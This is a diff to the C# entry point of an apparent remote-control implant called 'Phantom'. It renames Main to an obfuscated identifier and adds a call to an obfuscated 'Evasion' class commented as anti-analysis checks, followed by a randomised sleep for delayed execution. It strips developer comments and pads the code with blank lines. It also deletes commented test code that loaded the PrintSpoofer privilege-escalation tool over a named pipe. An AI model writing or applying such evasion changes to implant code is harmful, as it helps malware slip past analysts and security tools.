@@ -30,56 +30,63 @@ namespace Phantom
         private static AutoResetEvent _taskComplete  = new AutoResetEvent(false);
         private static bool _isFinished;
         private static Action<object> _flushData;
-        public static void Main(string[] args)
+        public static void J3m4n5o6(string[] args)
         {
-            //_transmitAction = (object p) =>
-            //{
-            //    PipeStream ps = (PipeStream)p;
-            //    while (ps.IsConnected && !_stopToken.IsCancellationRequested)
-            //    {
-            //        WaitHandle.WaitAny(new WaitHandle[]
-            //        {
-            //        _msgSendEvent,
-            //        _stopToken.Token.WaitHandle
-            //        });
-            //        if (!_stopToken.IsCancellationRequested && ps.IsConnected && _msgSendQueue.TryDequeue(out byte[] result))
-            //        {
-            //            ps.BeginWrite(result, 0, result.Length, ProcessSentMessage, p);
-            //        }
-            //    }
-            //    ps.Close();
-            //    _taskComplete.Set();
-            //};
+            try
+            {
+                // Anti-analysis checks
+                if (DateTime.Now.Year > 2020) 
+                { 
+                    X1a2b3c4.Evasion.H8i9j0k1.Q7w8e9r0();
+                } 
+                else 
+                { 
+                    return; 
+                }
+                
+                // Delayed execution
+                Thread.Sleep(Random.Shared.Next(2000, 5000));
+                
+                if (DateTime.Now.Year > 2020) 
+                { 
+                    StartAgent();
+                } 
+                else 
+                { 
+                    return; 
+                }
+            
+            
 
-            //AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", "exetest");
-            //client.ConnectionEstablished += OnConnectionReady;
-            //client.MessageReceived += ProcessReceivedMessage;
-            //client.Disconnect += OnConnectionClosed;
-            //IPCCommandArguments cmdargs = new IPCCommandArguments
-            //{
-            //    ByteData = System.IO.File.ReadAllBytes(@"C:\PrintSpoofer\x64\Release\PrintSpoofer.exe"),
-            //    StringData = "PrintSpoofer.exe --help"
-            //};
-            //if (client.Connect(3000))
-            //{
-            //    DataChunk[] chunks = _dataSerializer.SerializeIPCMessage(cmdargs);
-            //    foreach (DataChunk chunk in chunks)
-            //    {
-            //        _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(_dataSerializer.Serialize(chunk)));
-            //    }
-            //    _msgSendEvent.Set();
-            //    WaitHandle.WaitAny(new WaitHandle[]
-            //    {
-            //                                    _taskComplete,
-            //                                    _stopToken.Token.WaitHandle
-            //    });
-            //}
-            //else
-            //{
-            //    Debugger.Break();
-            //}
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
 
-            // This is main execution.
+            
             Agent.Phantom ap = new Agent.Phantom(Settings.AgentIdentifier);
             ap.Start();
         }
@@ -98,7 +105,7 @@ namespace Phantom
         private static void ProcessSentMessage(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
-            // Potentially delete this since theoretically the sender Task does everything
+            
             if (pipe.IsConnected)
             {
                 pipe.EndWrite(result);
@@ -127,7 +134,7 @@ namespace Phantom
             }
 
             ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
-            //Console.WriteLine("We got a message: {0}", mt.ToString());
+            
             _msgRecvQueue.Enqueue(msg);
             _msgRecvEvent.Set();
         }
